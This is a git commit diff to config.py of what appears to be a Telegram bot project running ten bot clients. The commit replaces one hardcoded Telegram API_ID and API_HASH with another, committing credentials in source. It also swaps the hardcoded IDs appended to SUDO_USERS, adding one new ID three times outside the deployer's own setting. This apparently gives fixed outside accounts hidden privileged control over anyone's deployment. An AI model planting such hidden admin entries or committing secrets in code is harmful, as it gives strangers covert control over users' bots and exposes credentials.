551240cdbb08e2bb5de2a28af59974347c9a2d5b
toxicop77 <107669917+toxicop77@users.noreply.github.com>
2023-05-14 11:54:55 +0530

    Update config.py

--- config.py
+++ config.py
@@ -10,8 +10,8 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 
 #values
-API_ID = 18136872
-API_HASH = "312d861b78efcd1b02183b2ab52a83a4"
+API_ID = 18113160
+API_HASH = "b7d1835b6cf670da22e967f2f5fc4f98"
 CMD_HNDLR = getenv("CMD_HNDLR", default=".")
 HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
 HEROKU_API_KEY = config("HEROKU_API_KEY", None)
@@ -26,9 +26,9 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-SUDO_USERS.append(1410250744)
-SUDO_USERS.append(5327845950)
-SUDO_USERS.append(1211015395)
+SUDO_USERS.append(5023678003)
+SUDO_USERS.append(5023678003)
+SUDO_USERS.append(5023678003)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
@@ -38,13 +38,13 @@ DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
 
 # Tokens
-MK1 = TelegramClient('MK', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
-MK2 = TelegramClient('MK2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
-MK3 = TelegramClient('MK3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
-MK4 = TelegramClient('MK4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
-MK5 = TelegramClient('MK5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
-MK6 = TelegramClient('MK6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
-MK7 = TelegramClient('MK7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
-MK8 = TelegramClient('MK8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
-MK9 = TelegramClient('MK9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
-MK10 = TelegramClient('MK10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
+TX1 = TelegramClient('MK', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+TX2 = TelegramClient('MK2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
+TX3 = TelegramClient('MK3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
+TX4 = TelegramClient('MK4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
+TX5 = TelegramClient('MK5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
+TX6 = TelegramClient('MK6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
+TX7 = TelegramClient('MK7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
+TX8 = TelegramClient('MK8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
+TX9 = TelegramClient('MK9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
+TX10 = TelegramClient('MK10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
